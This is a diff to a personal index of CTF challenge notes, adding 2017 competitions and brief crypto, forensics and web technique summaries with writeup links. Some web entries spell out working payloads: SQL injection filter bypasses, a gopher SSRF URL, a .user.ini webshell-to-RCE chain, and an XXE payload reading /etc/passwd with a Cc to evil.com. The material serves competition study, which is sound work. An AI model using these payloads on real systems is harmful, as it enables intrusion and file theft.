@@ -11,9 +11,9 @@ https://github.com/zardus/ctf-tools http://www.kitploit.com/2016/03/ctf-tools-so
 # still online
 https://backdoor.sdslabs.co/challenges
 
-# general notes
-csaw challs & writeups of all past CTFs: https://github.com/isislab/ (was https://ctf.isis.poly.edu/writeups/)
-ndh and volgactf all writeups: http://sigint.ru/writeups/
+# all past writeups
+csaw: https://github.com/isislab/ (was https://ctf.isis.poly.edu/writeups/)
+ndh and volgactf: http://sigint.ru/writeups/
 
 # gone over (skipped pwn & reverse tasks) {{{
 * pico-ctf-2013
@@ -78,7 +78,7 @@ ndh and volgactf all writeups: http://sigint.ru/writeups/
 * pragyan-ctf-2015
 * rctf-quals-2015 no writeups
 * ructfe-ad-2015 no writeups
-* sCTF-2015
+* sctf-2015
 * school-ctf-2015 no eng writeups
 * school-ctf-winter-2015
 * seccon-quals-ctf-2015
@@ -136,7 +136,28 @@ ndh and volgactf all writeups: http://sigint.ru/writeups/
 * tjctf-2016
 * tu-ctf-2016
 * tum-ctf-2016
-
+* insomnihack-teaser-2017
+* breakin-ctf-2017
+* alexctf-2017
+* bitsctf-2017
+* nullcon-hackim-2017
+* bsides-sanfransisco-ctf-2017
+* boston-key-party-2017
+* 0ctf-2017
+* volga-ctf-quals-2017
+* insomnihack-ctf-2017
+* pico-ctf-2017
+* nuitduhack-quals-2017
+* asis-ctf-quals-2017
+* plaidctf-2017
+* uiuctf-2017
+* rctf-2017
+* sctf-2017
+* google-ctf-2017
+* secuinside-ctf-quals-2017
+* polictf-2017
+* meepwn-ctf-2017
+* ctfzone-2017
 
 # }}}
 
@@ -569,7 +590,7 @@ once we have reovered salt, we decrypt target ciphertext by constructing a rever
 https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/BCTF/crypto/weak_enc
 
 * warmup - bctf-2015
-rsa wiener attack
+rsa wiener
 https://github.com/ctfs/write-ups-2015/tree/master/bctf-2015/crypto/warmup
 
 * wood island - boston-key-party-2015
@@ -685,7 +706,7 @@ exploit polynomial of HMAC
 https://github.com/ctfs/write-ups-2015/tree/master/mma-ctf-2015/web/motto-mijkai-address-400
 
 * curious - plaidctf-2015
-rsa wiener attack
+rsa wiener
 https://github.com/ctfs/write-ups-2015/tree/master/plaidctf-2015/crypto/curious
 
 * strength - plaidctf-2015
@@ -725,8 +746,7 @@ linear congruential generator.
 https://github.com/smokeleeteveryday/CTF_WRITEUPS/blob/master/2015/VOLGACTF/crypto/lcg/README.md
 
 * rsa - volgactf-quals-2015
-huge public exponent may mean small private exponent
-use Wiener's attack to recover the private exponent
+rsa wiener (huge public exponent may mean small private exponent)
 https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/VOLGACTF/crypto/rsa
 
 * collision course - backdoor-ctf-2016
@@ -1040,6 +1060,74 @@ https://github.com/ctfs/write-ups-2016/tree/master/tu-ctf-2016/crypto/hash-n-bak
 * hiecss - tum-ctf-2016
 forge ecc signature
 https://github.com/ctfs/write-ups-2016/tree/master/tum-ctf-2016/crypto/hiecss-150
+
+* tacos - tum-ctf-2016
+bypassing Fermat primality test with Carmichael numbers and solving discrete logarithm using Pohlig-Hellman algorithm
+http://mslc.ctf.su/wp/tum-ctf-2016-tacos-crypto-300/
+
+* ndis - tum-ctf-2016
+attacking nonce-repeating TLS server using AES-GCM cipher.
+http://mslc.ctf.su/wp/tum-ctf-2016-ndis-crypto-300/
+
+* shaman - tum-ctf-2016
+hash length extension, manipulation of secret shares
+http://mslc.ctf.su/wp/tum-ctf-2016-shaman-crypto-500/
+
+* multi party computation - boston-key-party-2017
+paillier cryptosystem
+http://www.rogdham.net/2017/02/27/boston-key-party-2017-write-ups.en
+
+* sponge - boston-key-party-2017
+meet in the middle to find collision for a custom hash using AES
+https://ctftime.org/task/3496
+
+* paillier service - easy-ctf-2017
+easy Paillier Cryptosystem challenge
+https://github.com/HackThisCode/CTF-Writeups/blob/master/2017/EasyCTF/Paillier%20Service/README.md
+
+* curved - volga-ctf-quals-2017
+ecdsa reused nonce
+https://github.com/epadctf/volgactf/tree/master/curved
+
+* encrypted shell - pico-ctf-2017
+Pollard's Kangaroo Algorithm and sage to break diffie hellman
+https://hgarrereyn.gitbooks.io/th3g3ntl3man-ctf-writeups/content/2017/picoCTF_2017/problems/cryptography/Encrypted_Shell/Encrypted_Shell.html
+
+* alice, bob and rob - asis-ctf-quals-2017
+McElice PKC
+https://grocid.net/2017/04/08/asis-ctf17/
+
+* eula - uiuctf-2017
+Bleichenbacher’s signature forgery on e=3 and PKCS#1 v1.5
+https://tylerkerr.ca/b/2017/04/uiuctf-2017-eula
+
+* papaRSA - uictf-2017
+e=5, solve with Coppersmith's method, which uses the Lenstra–Lenstra–Lovász lattice basis reduction algorithm (LLL)
+https://hgarrereyn.gitbooks.io/th3g3ntl3man-ctf-writeups/content/2017/UIUCTF/problems/Cryptography/papaRSA/
+
+* ranshomware - sctf-2017
+aes-ctr with reuse IV
+https://jbzteam.github.io/crypto/SecurityFest2017-Ranshomware
+
+* rsa ctf challenge - google-ctf-2017
+Bleichenbacher's signature forgery on e=3 and PKCS#1. v1.5
+solve with Filippo Valsorda CVE-2016-1494 technique
+http://karabut.com/google-ctf-2017-quals-rsa-ctf-challenge-writeup.html
+
+* lucky consecutive guessing - polictf-2017
+fixed lcg with partial output
+classic linear congruential generator, where the current random number is not the full state, but just the 32 most significant bits.
+https://jbzteam.github.io/crypto/PoliCTF2017-LuckyConsecutiveGuessing
+
+* splyt - polictf-2017
+Shamir Secret Sharing Scheme
+secret split into N shares so that at least T shares are needed to reconstruct the secret
+specifically, each character in the secret (in this case our flag) is being splitted into N shares
+https://dowsll.github.io/writeups/polictf2017/splyt
+
+* mprsa - ctfzone-2017
+rsa wiener
+https://github.com/p4-team/ctf/tree/master/2017-07-15-ctfzone/mprsa
 
 # }}}
 
@@ -1368,6 +1456,15 @@ https://ced.pwned.systems/hitb-2016-ctf-net100-good-food-sources.html
 * corruption - tjctf-2016
 png with every chunk length and crc corrupted
 https://bobacadodl.gitbooks.io/tjctf-2016-writeups/content/corruption_130_pts.html
+
+* robot plans - hack-lu-ctf-2013
+md5s of lock pattern for android (gesture hashes)
+https://thufirhowatt.wordpress.com/hack-lu-ctf-robot-plans-writeup/
+or like in ctfx-2016/iTrash find gesture.key and follow http://resources.infosecinstitute.com/android-forensics-cracking-the-pattern-lock-protection/
+
+* secr3tmgr lock - insomnihack-ctf-2017
+crack android lockscreen password from /data/system/password.key and device_policies.xml
+http://arishitz.net/writeup-secr3tmgr-forensic-insomnihack-2017/
 
 # }}}
 
@@ -1698,7 +1795,7 @@ https://github.com/ctfs/write-ups-2016/tree/master/nullcon-hackim-2016/web/unick
 break captcha
 http://gnoobz.com/sharif-ctf-2016-web-250-oldpersian.html solving via image compare 100% success and super simple
 
-* bugbounty - boston-key-party-ctf-2016
+* bugbounty - boston-key-party-2016
 bypass csp with
 <link rel="prefetch" href="http://me/">  
 <meta http-equiv="refresh" content="0; url=http://me/i">
@@ -1844,14 +1941,110 @@ https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2016/TUCTF/web/Luc
 css injection
 https://github.com/ctfs/write-ups-2016/tree/master/whitehat-contest-11/web/ultimate-design-tool-100
 
+* artisinal shoutboxes - boston-key-party-2017
+chain 2 xss, first xss sets cookie with second xss payload to exfil admin page content
+http://www.rogdham.net/2017/02/27/boston-key-party-2017-write-ups.en
+
+* prudentialv2 - boston-key-party-2017
+sha1 collision (only use first 260 bytes of poc pdfs)
+http://www.rogdham.net/2017/02/27/boston-key-party-2017-write-ups.en
+
+* zumbo3 - bsides-sanfransisco-ctf-2017
+ssti flask jinja2
+https://0day.work/bsidessf-ctf-2017-web-writeups/#zumbo3
+
+* flasking unicorns
+ssti to write python code to /tmp and run it via config.from_pyfile()
+https://0day.work/ictf-2017-flasking-unicorns-writeup-or-how-we-might-have-rooted-your-ictf-vm/
+
+* complicated xss - 0ctf-2017
+stripped XMLHttpRequest from window but can restore it from frames[0]
+chain 2 xss via cookie
+https://jiulongw.github.io/post/0ctf-2017-complicated-xss/
+
+* corp news - volga-ctf-quals-2017
+jquery xhr xss to change admin's pw
+http://fadec0d3.blogspot.com.au/2017/03/volgactf-2017-quals-corp-news-300.html
+
+* the great continuation - insomnihack-ctf-2017
+csrf + chain 2 xss, bypass csp via uploading file containing html
+https://blog.compass-security.com/2017/03/write-up-the-great-continuation/
+
+* smarttomcat2 - insomnihack-ctf-2017
+char @ blacklisted, bypass using gopher (u=gopher://localhost:8080/aGET%20/manager/html%20HTTP/1.1%250d%250aAuthorization:%20Basic...
+https://blog.compass-security.com/2017/03/write-up-smarttomcat2/
+
+* deep experiments - insomnihack-ctf-2017
+upload SHA.pm and .htaccess to break Perl publish.cgi server
+https://codisec.com/insomnihack-2017-deep-experiments/
+
+* maze - tamuctf-2017
+websocket, use console tab of developer tools to interact with ws socket: type socket.emit('bla', {a: 1, b: 2});
+https://ctftime.org/writeup/6575
+
+* paint - bctf-2017
+PHP-GD imagecreatefrompng()
+server concats 3 files, let file2 be the flag file, file1 and file3 are valid GIF prefix/suffix so that the resulting image is valid
+http://corb3nik.github.io/blog/bctf-2017/paint
+
+* br0kenmysql[123] - meepwn-ctf-2017
+id has to be 2 (guest) in the first query and 1 (admin) in the second query
+?id=(select case substring(uuid(),5,1) when 1 then 2 else 1 end)
+?id=1%2BCURRENT_TIMESTAMP%252' will bypass sleep|benchmark|floor|rand|count|select|from|\(|\)
+?id=case when @wurst is null then @wurst:=2 else @wurst:=@wurst-1 end will bypass sleep|benchmark|floor|rand|count|select|from|\(|\)|time|date|sec|day
+
+* flag shop - meepwn-ctf-2017
+sqli and bypass filter: whitespace with /*!50000*/, = with LIKE and AND with &&
+https://nightst0rm.net/2017/07/writeup-flag-shop-br0kenmysql-v3-meepwnctf/
+
+* lonelyboy - meepwn-ctf-2017
+xss via svg with XMLHttpRequest() because PhantomJS needs async
+apache server uses php-fpm so upload .user.ini with auto_append_file xx
+upload 2.jpg with php webshell and upload xx with <?=copy("2.jpg",2); and rce with GET /index.php
+then reupload xx with auto_append_file 2 and rce with /index.php?c=cat+...
+https://nightst0rm.net/2017/07/writeup-lonelyboy-meepwnctf/
+
+* rfile - rctf-2017
+lfi on flask app, in python3.5 server files are cached under __pycache__/ so retrieve ../__pycache__/conf.cpython-35.pyc to find flag
+https://ctftime.org/writeup/6714
+
+* rcdn - rctf-2017
+exploit Chrome's unicode size expansion during browser URL normalization to submit a subdomain of length <= 6 chars
+https://ctftime.org/writeup/6715
+
+* a template jest - sctf-2017
+nodejs (Express) command injection with /vuln/new%20Date()
+dump mem with Buffer(1e5) to find flag
+https://losfuzzys.github.io/writeup/2017/05/31/SCTF2017-temple-jest/
+
+* back to the past - google-ctf-2017
+AngularJS v1.5.8 sandbox escape via history.back(-1)
+https://ctftime.org/writeup/6815
+
+* a7 gee cue elle - google-ctf-2017
+GQL injection with rate limits
+https://github.com/p4-team/ctf/tree/master/2017-06-17-googlectf/a7_gee_cue_elle
+
+* mygf - secuinside-ctf-quals-2017
+use information_schema.processlist in sqli to leak secret key in first query (race)
+https://ctftime.org/writeup/6901
+
+* polishop - polictf-2017
+xpath blind injection
+https://ctftime.org/writeup/6954
+
+* pyzzeria - polictf-2017
+arbitrary read to leak hmac secret char by char
+https://devcraft.io/posts/2017/07/10/pyzzeria-polictf-2017.html
+
+* mr future president - ctfzone-2017
+email header injection + xxe
+subject=-->%26xxe;test123%0d%0aCc:+a@evil.com&encoding=UTF-8"%3f><!DOCTYPE+foo+[<!ELEMENT+foo+ANY+><!ENTITY+xxe+SYSTEM+"file%3a///etc/passwd"+>]><!--
+https://github.com/chamli/Write_Up_Ctf/blob/master/CTFZone%202017/Mr.Future%20President%20Blog.md
+
 # }}}
 
 # reverse {{{
-* robot plans - hack-lu-ctf-2013
-md5s of lock pattern for android (gesture hashes)
-https://thufirhowatt.wordpress.com/hack-lu-ctf-robot-plans-writeup/
-or like in ctfx-2016/iTrash find gesture.key and follow http://resources.infosecinstitute.com/android-forensics-cracking-the-pattern-lock-protection/
-
 * chrono logical - codegate-preliminary-2014
 disable timeout in select with setarch -T
 http://www.blue-lotus.net/2014-02-25-codegate-ctf-quals-2014-chrono-writeup/
